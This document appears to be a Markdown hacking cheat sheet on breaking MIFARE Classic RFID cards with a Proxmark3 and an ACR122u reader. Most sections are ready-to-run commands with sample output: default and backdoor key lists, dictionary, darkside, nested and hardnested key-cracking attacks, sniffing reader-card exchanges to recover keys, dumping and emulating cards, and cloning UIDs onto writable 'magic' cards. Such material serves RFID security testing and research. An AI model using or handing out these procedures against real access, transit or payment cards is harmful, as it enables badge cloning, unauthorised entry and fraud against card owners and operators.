# HF - Mifare Classic

## HF - Mifare Classic 1k

New method for Proxmark : `hf mf autopwn`


### Dictionary attack

Common keys to try against the card when attempting a dictionnary attack.

| Key | Description |
| ---- | ---- |  
| FFFFFFFFFFFF | Default key | 
| 000000000000 | Blank key | 
| A396EFA4E24F | FM11RF08S universal backdoor key | 
| A31667A8CEC1 | FM11RF08 older backdoor key | 

More keys and dictionnaries can be found at the following links:

* [RfidResearchGroup/proxmark3/dictionaries](https://github.com/RfidResearchGroup/proxmark3/tree/master/client/dictionaries)
* [ikarus23/MifareClassicTool/std.keys](https://github.com/ikarus23/MifareClassicTool/blob/master/Mifare%20Classic%20Tool/app/src/main/assets/key-files/std.keys)
* [ikarus23/MifareClassicTool/extended-std.keys](https://github.com/ikarus23/MifareClassicTool/blob/master/Mifare%20Classic%20Tool/app/src/main/assets/key-files/extended-std.keys)

```powershell
hf mf chk *1 ? t # Default keys
hf mf chk *1 ? d default_keys.dic
hf mf chk 0 A default_keys.dic # Dictionary attack with file: default_keys.dic
```


### Darkside attack (PRNG Weak)

**Proxmark method**

```powershell
pm3> hf search
pm3> hf mfu
pm3> hf mf darkside  (fork command)
pm3> hf mf mifare    (original command)
Parity is all zero. Most likely this card sends NACK on every failed authentication. # Card is empty...
or
Found valid key:ffffffffffff # KEY_FOUND

pm3> hf mf chk 0 A KEY_FOUND    (Check Found Key On Block 0 A)
```

**ACR122u method**

```powershell
# start cracking the first key of the first sector. 
mfcuk -C -R 0:A -v 3 -s 250 -S 250
mfcuk -C -R 3:A -v 3 -s 250 -S 250 -o mycard.mfc
```

### Nested attack (PRNG Weak)

> Need to find a default key to extract the others

**Proxmark method**

```powershell
hf search
hf mf chk 1 ? t                      # "Test Block Keys" command which will test the default keys for us
hf mf nested 1 0 A a0a1a2a3a4a5 t.   # "Nested Attack" use the key a0a1a2a3a4a5, keeping the key in memory with "t"
hf mf chk * ?                        # "Test Block Keys" command which will test the default keys for us
hf mf nested 1 0 A ffffffffffff   d  # "Nested Attack" use the key ffffffffffff to extract the others (file:dumpkeys.bin)
hf mf dump 1                         # Dump content
hf mf restore 1                      # Restore content into the card
hf mf wrbl 5 A 080808080808 32110000cdeeffff3211000005fa05fa  # write on block 5, with the key 0808... the content 3211...
hf mf rdbl 5 A 080808080808          # Read block 5 with the keu 0808..


python pm3_mfd2eml.py dumpdata.bin dumpdata.eml
pm3> hf mf cload dumpdata
```

**ACR122u method**

```powershell
nfc-list
mfoc -O card.mfd # dump the memory of the tag
# Le paramètre P permet de spécifier le nombre de sondes par secteur. Par défaut, ce nombre est à 20 mais nous pouvons le passer à 500.
mfoc -P 500 -O dump_first_try.dmp
nfc-mfclassic w a key.mfd data.mfd # write data
nfc-mfclassic W a key.mfd data.mfd # write data and sector 0
```

### Hardnested attack

> One key is needed in order to use this attack

For newest MIFARE Classic and MIFARE Plus SL1

**Proxmark method**

:warning: NOTE: These hardware changes resulted in the Proxmark 3 Easy being incapable of performing several of the Proxmark's advanced features, including the Mifare Hard-Nested attacks. In other word you need a real Proxmark, not a cheap chinese copy.

```powershell
# find a default key
# res column is either equal to 1 or 0. 
# A 1 in the column means the key was valid for that sector.
hf mf chk *1 ? t


# <block number> <key A|B> <key (12 hex symbols)>
# <target block number> <target key A|B> [known target key (12 hex symbols)] [w] [s]
# w: Acquire nonces and write them to binary file nonces.bin
hf mf hardnested 0 A 8829da9daf76 4 A w

# then https://github.com/aczid/crypto1_bs
./solve_piwi 0xcafec0de.bin
./solve_piwi_bs 0xcafec0de.bin
```

**ACR122u method**

With the key n°A a0a1a2a3a4a5 for sector 0 and we want key n°A for sector 1. This method can be reused for every sectors.

```powershell
./libnfc_crypto1_crack a0a1a2a3a4a5 0 a 4 a
Found tag with uid 62ef9e5a, collecting nonces for key A of block 4 (sector 1) using known key A a0a1a2a3a4a5 for block 0 (sector 0)
Collected 2379 nonces... leftover complexity 23833993588 (~2^34.47) - initializing brute-force phase...
Starting 4 threads to test 23833993588 states using 256-way bitslicing
Cracking...  88.93%
Found key: c44e2b5e4ce3
Tested 21232975852 states
```

### Magic Chinese Card - Acronyms

**UID** - The original Chinese Magic Backdoor card. These cards respond to the backdoor commands and will show Chinese magic backdoor commands (GEN 1a) detected when you do an hf search. These cards can be detected by probing the card to see if it responds to the backdoor commands. Some RFID systems may try to detect these cards.

**CUID** - The 2nd generation Chinese Magic Backdoor card. These cards do not use the backdoor commands, but instead allow Block 0 to be written to like any other block on the card. This gives the card better compatibility to be written to from an Android phone. However, some RFID systems can detect this type of card by sending a write command to Block 0, making the card invalid after the first use is attempted.

**FUID** - This type of card is not as common, but allows Block 0 to be written to just once. This allows you to create a clone of a card and any checks done by the RFID system will pass because Block 0 is no longer writable.

**UFUID** - This type of card is apparently a "better" version of the FUID card. Instead of only allowing Block 0 to be written once, you can write to it many times and then lock the block later when you're happy with the result. After locking Block 0, it cannot be unlocked to my knowledge. I do not think there is currently a way to lock these cards using the Proxmark3.

### Magic Chinese Card - GEN 2

They can be copied directly. The software allows a new UID.

### Magic Chinese Card - GEN 1a

> **Works better on the official client.py instead of the iceman fork.**

Reset a UID Changeable Magic Card (7 bytes UID) :warning: You should prefer this method !

```powershell
proxmark3> hf mf csetuid 42917CAB 0004 08
uid:42 91 7c ab           
--atqa:00 04  sak:08          
Chinese magic backdoor commands (GEN 1a) detected  
```

To set all the block `hf mf csetblk 0 42917CAB00080400022A2C87933EF21D`

NOTE: The UID from several cards can be computed with the displayed id, e.g: ID is 2910621770.

```python
import struct
struct.pack('<I',2910621770).encode('hex')
'4a907cad'
```

### Unbricking Chinese Magic Mifare Classic

If you set the wrong BCC for UID and can't read the card anymore, you can use some backdoor commands to change sector 0 using Proxmark:

```powershell
hf 14a raw -a -p -b 7 40
hf 14a raw -p 43
hf 14a raw -p -c a0 00
hf 14a raw -p -c de ad be ef 22 08 04 00 46 59 25 58 49 10 23 02
```


### Write and read sectors

> Avoid writing wrbl 3 (contains key A/B + permissions)

```powershell
proxmark3> hf mf wrbl 1 a ffffffffffff 000102030405060708090a0b0c0d0e0f   
proxmark3> hf mf wrbl 2 a ffffffffffff 464c4147313a4d31664072335f303037
```

```powershell
hf mf rdsc <sector number> <key A/B> <key (12 hex symbols)>
```

### Dump Mifare card

```powershell
proxmark3> hf mf dump 1 k hf-mf-A29558E4-key.bin f hf-mf-A29558E4-data.bin

<card memory>: 0 = 320 bytes (Mifare Mini), 1 = 1K (default), 2 = 2K, 4 = 4K
k <name>     : key filename, if no <name> given, UID will be used as filename
f <name>     : data filename, if no <name> given, UID will be used as filename
```

### Simulate and emulate Mifare card

Emulate from a dump file

```powershell
# convert .bin to .eml
proxmark3> script run dumptoemul -i dumpdata.bin
proxmark3> hf mf eload <file name w/o .eml>
```

Simulate Mifare 1K UID

```powershell
proxmark3> hf mf sim u 353c2aa6
```

### MITM attack

```powershell
hf 14a snoop
# read card
# push button

hf list 14a
089220 |   095108 | Tag | 4d  xx  xx  xx  d3                                              |     | UID
114608 |   125072 | Rdr | 93  70  4d  xx  xx  xx  d3  4f  8d                              |  ok | SELECT_UID
...
525076 |   529748 | Tag | 61  7a  66  18                                                  |     | TAG CHALLENGE
540608 |   549920 | Rdr |50! 87!  8e  ab 3b!  49  5a  1b                                  | !crc| HALT
551188 |   555860 | Tag |d6! 53!  7c 57!                                                  |     | TAG RESPONSE
UID: 4dxxxxxxd3
TAG CHALLENGE: 617a6618
READER CHALLENGE: 50878eab
READER RESPONSE: 3b495a1b
TAG RESPONSE: d6537c57

# crapto1gui or mfkey
cd tools/mfkey
make
./mfkey64
./mfkey64 xxxxxxxx 3b45a45a 7ddb6646 142fc1b9 9195fb3f
```

### Reader only attack

Emulate a MIFARE Classic with a DEADBEEF UID.

```powershell
proxmark3> hf mf sim u deadbeef n 1 x
mf 1k sim uid: de ad be ef , numreads:0, flags:18 (0x12)
#db# Collected two pairs of AR/NR which can be used to extract keyA from reader for sector 1:
#db# ../tools/mfkey/mfkey32 deadbeef 0102xxxx 4d9axxxx 87e7xxxx 06d2xxxx b4a0xxxx
#db# Emulator stopped. Tracing: 1 trace length: 253
#db# 4B UID: deadbeef
```

### Read a Mifare Dump

```powershell
pip install bitstring
git clone https://github.com/zhovner/mfdread
mfdread.py ./dump.mfd
```

## HF - Mifare Classic 4k

### Chinese Magic Mifare Classic 4K

Block 0 is writable through normal Mifare Classic commands, i.e. there is not special "unlocked" read/write like in "magic Mifare 1k" version.

Writing block 0 with Proxmark, UID `01020304`, using key A being `FFFFFFFFFFFF`:

```powershell
hf mf wrbl 0 a FFFFFFFFFFFF 01020304040000000000000000000000
```

Again, watch out to have correct BCC and avoid Cascading Tag (0x88) as first byte of UID, or you may make the card unselectable (i.e. brick it).



## References

* [Mifare HowTo - Qais Patankar - Jan 7, 2018](https://github.com/Proxmark/proxmark3/wiki/Mifare-HowTo)
* [Proxmark3 Mifare Classic 1k Weak / Hard - Guillaume - November 29, 2017](https://guillaumeplayground.net/proxmark3-hardnested/)
* [Electronique/Hardware/Divers/RFID/Proxmak3/Mf (Mifare) - 12 janvier 2022](https://www.ordinoscope.net/index.php/Electronique/Hardware/Divers/RFID/Proxmak3/Mf_(Mifare))
* [Proxmark 3, le couteau suisse RFID - Bourdin Pierre - octobre 2017](https://connect.ed-diamond.com/MISC/MISCHS-016/Proxmark-3-le-couteau-suisse-RFID)
* [Hacking MIFARE & RFID - phantasmthewhite - Jan 22, 2019](https://hackmethod.com/hacking-mifare-rfid/)
* [Hacking our first MIFARE/RFID Tag - phantasmthewhite - Feb 1, 2019](https://hackmethod.com/hacking-mifare-rfid-2/)
* [Coffee, NFC, Exploit, Coffee again - ari_ - 14 NOVEMBER 2017](http://arishitz.net/coffee-nfc-exploit-coffee-again/)
* [ACR122U, mfcuk, and mfoc: Cracking MIFARE Classic on Arch Linux - Linus Karlsson - 2014-08-18](https://linuskarlsson.se/blog/acr122u-mfcuk-and-mfoc-cracking-mifare-classic-on-arch-linux/)
* [Reading NFC cards - Flipper Docs](https://docs.flipper.net/nfc/read)
* [MIFARE Classic: exposing the static encrypted nonce variant - Philippe Teuwen](https://eprint.iacr.org/2024/1275.pdf)